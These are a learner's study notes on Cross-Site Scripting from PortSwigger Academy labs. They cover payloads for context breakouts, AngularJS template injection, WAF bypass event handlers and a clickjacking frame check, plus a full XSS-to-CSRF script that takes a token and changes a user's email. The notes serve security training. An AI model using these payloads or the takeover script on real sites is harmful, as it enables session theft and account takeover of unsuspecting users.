# My-Security-Log-2-XSS
This my public notes regarding my experiences with the Cross-Site Scripting (XSS) topic on PortSwigger Academy.

**Date:** January 5, 2026  
**Source:** PortSwigger Academy & Personal Study Notes

---

## Research Overview
XSS is a sophisticated vulnerability class where the attacker aims to "wedge" themselves into the frontend. While SQLi involves deceiving the backend database, XSS focuses on executing malicious scripts in the victim's browser context. My research covered the spectrum from simple reflected scripts to complex DOM-based injections and WAF bypasses.

### 1. Vector Identification & Context Breaking
Finding an XSS entry point requires testing how the application handles input in different parts of the HTML/JS structure:
* **Initial Checks:** Simple `<script>alert(1)</script>` to test for raw reflection.
* **Attribute Injection:** Using `"><svg onload=alert(1)>` to break out of input values or `onmouseover="alert(1)` when standard tags are filtered.
* **JavaScript Breakouts:** Escaping JS variables via `'-alert(1)-'` or template literals `${alert(1)}`. If the server attempts to escape quotes (e.g., `\'`), I use the `\"-alert(1)}//` or `\'-alert(1)//` technique to neutralize the escape character.
* **URL-Based Sinks:** Exploiting parameters like `?returnPath=javascript:alert(document.cookie)` or injecting into search queries where brackets are improperly handled (e.g., `<><img src=1 onerror=alert(1)>`).

### 2. Client-Side Template Injection (DOM XSS)
* **AngularJS Logic:** Even if a server encodes brackets, client-side frameworks like AngularJS might still be vulnerable. By identifying the framework (e.g., `angular_1-7-7.js`) and using a template test like `{{7*7}}`, one can execute complex expressions: `{{$on.constructor('alert(1)')()}}`.
* **The Process:** The server sends the payload (potentially encoded), but once the browser renders it, AngularJS scans the DOM for its "markers" (double curly braces) and executes the parsed content as an expression.

### 3. Advanced WAF & Filter Bypassing
When a Web Application Firewall (WAF) is present, I use **Burp Suite Intruder** to brute-force allowed tags and events (e.g., testing `<par> <tag%20par=>`).
* **Stealthy Triggers:** Utilizing event handlers like `<body onresize="print()">` or SVG-specific tags like `<svg><animatetransform onbegin=alert(1)>`.
* **Focus & Access Keys:** Forcing focus with `<xss id=x onfocus=alert(document.cookie) tabindex=1>#x` or binding a payload to keyboard shortcuts with `?accesskey='x'onclick='alert(1)`.
* **Alternative Bypasses:** Sometimes `</script><script>alert(1)</script>` or using HTML entities like `&apos;` in `onclick` attributes is enough to slip through.

---

## Technical Cheat Sheet

### Framing & Defensive Headers
Analyzing if a site can be hosted within a malicious iframe to hijack sessions (Clickjacking/Framing).
* **Manual Check (Console):** `document.body.innerHTML = '<iframe src="https://target.site"></iframe>'`
* **Detection via Burp:** Check `HTTP History -> Response`. If the following are missing, the site is "naked":

| Header | Options | Description |
| :--- | :--- | :--- |
| **X-Frame-Options** | `DENY` / `SAMEORIGIN` | Legacy standard for blocking frames. |
| **Content-Security-Policy** | `frame-ancestors 'none'` / `'self'` | Modern "Swiss Army Knife" for frame control. |

### XSS-to-CSRF Chain (Account Takeover)

This script demonstrates how XSS can be used to exfiltrate a CSRF token and perform an unauthorized action (e.g., changing an email) from the user's session:
```javascript
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    // Extract CSRF token from the response
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    // Perform an unauthorized action using the stolen token
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com');
};

---

## Personal Insights & Conclusions

> **Author's Perspective:**
> XSS has proven to be the most complex topic I’ve encountered so far. To an outside observer, manual probing through these "hieroglyphs" of encoded payloads might seem like magic, but the logic across different scenarios is now clear to me. 
>
> While SQLi is a direct attack on the data (backend), XSS is a battle for the frontend. One should never underestimate the danger of a frontend attack. It is a vast playground for high-level phishing. Imagine a scenario where a user receives an email from a "trusted colleague" containing a link to a familiar, legitimate site. One click is all it takes for a malicious JS injection to exfiltrate session cookies or change account credentials. The room for creative damage is enormous once you master the underlying principles of XSS vulnerabilities.

---

## Future Roadmap
* **OS Command Injection:** repeat and reinforce.

---
*Notes compiled based on PortSwigger Academy research materials.*
